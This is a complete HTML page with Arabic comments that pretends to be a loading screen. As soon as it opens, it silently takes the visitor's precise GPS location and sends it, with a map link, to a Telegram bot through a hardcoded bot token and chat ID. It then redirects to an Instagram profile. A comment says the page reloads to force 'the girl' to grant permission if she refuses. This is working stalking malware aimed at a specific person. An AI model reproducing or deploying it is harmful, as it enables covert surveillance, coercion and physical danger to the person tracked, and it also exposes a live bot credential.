<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <p>جاري التحميل، يرجى الانتظار...</p>
    </div>

<script>
    // بياناتك الخاصة
    const botToken = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chatId = '7214473798';

    function getLocation() {
        // إعدادات الدقة القصوى لضمان تحديد المكان "بظبط"
        const options = {
            enableHighAccuracy: true, // استخدام الـ GPS
            timeout: 20000,           // مدة المحاولة 20 ثانية
            maximumAge: 0             // عدم استخدام موقع قديم
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                // رابط جوجل ماب المباشر الذي يفتح تطبيق الخرائط فوراً
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                const message = `🎯 **تم تحديد الموقع بنجاح!**\n\n` +
                                `📍 الرابط المباشر:\n${mapLink}\n\n` +
                                `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;

                // إرسال البيانات لتليجرام
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
                .then(() => {
                    // بعد الإرسال، يتم التحويل لإنستغرام لإنهاء العملية
                    window.location.href = "https://www.instagram.com/ha2542213";
                });

            }, function(error) {
                // إذا رفضت البنت، يتم إعادة تحميل الصفحة لإجبارها على الموافقة
                location.reload();
            }, options);
        }
    }

    // بدء العمل فور فتح الرابط
    window.onload = getLocation;
</script>
</body>
</html>
